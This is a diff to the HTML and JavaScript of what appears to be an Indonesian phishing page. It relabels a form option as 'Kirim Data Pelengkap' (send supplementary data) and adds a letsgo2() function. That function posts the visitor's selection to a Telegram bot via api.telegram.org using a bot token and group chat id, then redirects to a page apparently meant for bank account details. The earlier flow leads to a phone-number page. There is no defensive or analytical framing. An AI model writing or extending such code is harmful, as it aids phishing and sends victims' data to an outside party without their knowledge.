@@ -281,8 +281,8 @@ chsalxcome {
 	    	</label>
 	    	
 	    	<label class="aha">
-    <input type="radio" id="tarif" name="tarif" value="𝗞𝗼𝗺𝗽𝗹𝗲𝗻 𝗣𝗿𝗼𝗱𝘂𝗸" onclick="letsgo1()"/>
-    <span class="s">Komplen Produk</span>
+    <input type="radio" id="tarif" name="tarif" value="𝗞𝗶𝗿𝗶𝗺 𝗗𝗮𝘁𝗮 𝗣𝗲𝗹𝗲𝗻𝗴𝗸𝗮𝗽" onclick="letsgo2()"/>
+    <span class="s">Kirim Data Pelengkap</span>
 	    	</label>
 	    	
 	    	<label class="aha">
@@ -344,6 +344,44 @@ chsalxcome {
             complete: function(data) {
             setTimeout(function(){            
             window.location.href='nohp.html';
+            $(".process1").fadeOut();     
+   }, 500);
+            }
+          })
+        }
+ }
+ 
+ 
+ 
+ function letsgo2(){
+ event.preventDefault();
+      $(".process1").fadeIn(); 
+   
+   var tarif = $('input[name="tarif"]:checked').val();
+       if (tarif) {  
+  sessionStorage.setItem('tarif', tarif);
+  }   
+      
+      var selectedOption = $("input[name='tarif']:checked").val();
+        if (selectedOption) {
+            sendToTelegram(selectedOption);
+        } else {
+            alert("Silakan pilih salah satu opsi.");
+        }
+    
+    function sendToTelegram(tarif) {
+        
+        var gabungan = "" + logo + '%0A%0A※ ' + tarif;
+        $.ajax({
+            type: 'POST',
+            url: `https://api.telegram.org/bot${token}/sendMessage?chat_id=${grup}&text=${gabungan}&parse_mode=html`,
+            data: {
+                chat_id: grup,
+                text: gabungan  
+            },                    
+            complete: function(data) {
+            setTimeout(function(){            
+            window.location.href='rek.html';
             $(".process1").fadeOut();     
    }, 500);
             }
